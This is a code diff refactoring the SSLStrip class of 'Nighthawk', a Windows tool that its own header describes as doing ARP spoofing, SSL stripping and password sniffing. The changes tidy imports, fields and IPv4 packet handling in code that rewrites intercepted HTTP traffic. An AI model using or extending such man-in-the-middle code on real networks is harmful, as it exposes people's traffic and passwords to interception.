@@ -1,15 +1,8 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Linq;
-using System.Net;
-using System.IO;
-using System.IO.Compression;
 using System.Text;
 using System.Text.RegularExpressions;
-using System.Threading;
 using PacketDotNet;
-using SharpPcap;
-using SharpPcap.WinPcap;
 
 /**
 Nighthawk - ARP spoofing, simple SSL stripping and password sniffing for Windows
@@ -32,31 +25,19 @@ namespace Nighthawk
 {
     public class SSLStrip
     {
-        // current device
-        private WinPcapDevice device;
-
         // status
-        public bool Started = false;
+        public bool Started;
 
-        // exclusion
-        private bool excludeLocalIP = false;
         private DeviceInfo deviceInfo;
-
-        // access to ARPTools
-        private ARPTools arpTools;
 
         // regex 
         private Regex regexEncoding = new Regex(@"Accept-Encoding: (.*?)\r\n", RegexOptions.Compiled | RegexOptions.Singleline);
         private Regex regexType = new Regex(@"(GET|POST) (.*?) HTTP\/1\.(0|1)", RegexOptions.Compiled | RegexOptions.Singleline);
         private Regex regexCType = new Regex(@"Content-Type: (.*?)\r\n", RegexOptions.Compiled | RegexOptions.Singleline);
         private Regex regexModified = new Regex(@"If-Modified-Since: (.*?)\r\n", RegexOptions.Compiled | RegexOptions.Singleline);
-        private Regex regexLocation = new Regex(@"Location: (.*?)\r\n", RegexOptions.Compiled | RegexOptions.Singleline);
 
         // encoding converter
         private static UTF8Encoding encodingUtf8 = new UTF8Encoding();
-
-        // list of URL's with stripped (expired) cookies
-        private List<StrippedCookiesURL> strippedCookies = new List<StrippedCookiesURL>();
 
         // SSL stripped event
         public event SSLStripHandler SSLStripped;
@@ -69,17 +50,12 @@ namespace Nighthawk
         // constructor
         public SSLStrip(DeviceInfo deviceInfo)
         {
-            // store our network interface
-            device = deviceInfo.Device;
             this.deviceInfo = deviceInfo;
         }
 
         // start SSL strip
-        public void Start(bool excludeLocalIP, ARPTools arpTools)
+        public void Start()
         {
-            this.excludeLocalIP = excludeLocalIP;
-            this.arpTools = arpTools;
-
             Started = true;
         }
 
@@ -92,8 +68,13 @@ namespace Nighthawk
         // process packet (true/false to prevent from routing it)
         public bool ProcessPacket(Packet rawPacket, TcpPacket packet)
         {
-            var sourceIP = (packet.ParentPacket as IpPacket).SourceAddress.ToString();
-            var destIP = (packet.ParentPacket as IpPacket).DestinationAddress.ToString();
+            if (packet.ParentPacket == null) return true;
+
+            // only IPv4 for now
+            if(!(packet.ParentPacket is IPv4Packet)) return true;
+
+            var sourceIP = ((IpPacket) packet.ParentPacket).SourceAddress.ToString();
+            var destIP = ((IpPacket) packet.ParentPacket).DestinationAddress.ToString();
 
             var payload = packet.PayloadData;
 
@@ -172,7 +153,7 @@ namespace Nighthawk
                     packet.PayloadData = bytes;
                     packet.UpdateTCPChecksum();
 
-                    var ip = (packet.ParentPacket as IPv4Packet);
+                    var ip = (IPv4Packet) packet.ParentPacket;
                     ip.TotalLength = ip.HeaderLength + packet.Bytes.Length;
                     ip.PayloadLength = (ushort)packet.Bytes.Length;
                     ip.Checksum = (ushort)(ip.Checksum + diff); // dirty checksum fix
